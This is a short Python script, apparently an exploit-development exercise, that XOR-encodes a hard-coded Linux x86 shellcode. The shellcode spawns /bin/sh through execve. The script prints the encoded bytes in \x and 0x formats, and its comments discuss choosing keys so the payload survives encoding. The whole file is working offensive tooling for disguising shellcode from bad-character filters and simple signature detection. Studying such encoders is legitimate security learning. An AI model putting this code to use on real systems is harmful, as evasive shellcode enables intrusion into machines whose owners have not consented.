#!/usr/bin/env python

#Name: Xor Encoder
#Author: Surreal

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoder = 0xAA                          #What to XOR shellcode with (can we create a random array of different bytes, and iterate through it so each one is XORed with a different byte?)
                                        #Also this value can not be used inside the unencoded shellcode.... because XORing with same value (OxAA^0xAA = 0) and that will mess stuff up.
encoded_int = ''
encoded_char = ''

for byte in bytearray(shellcode):
    enc_byte = byte^0xAA          #XOR's [byte] of shellcode with encoder

    encoded_int += '0x'                 #Prints encoded with 0x for ints
    encoded_int += '%02x' % enc_byte

    encoded_char += '\\x'               #Prints encoded with \x for strings
    encoded_char += '%02x' % enc_byte

print('\n' + encoded_char + '\n')

print(encoded_int + '\n')
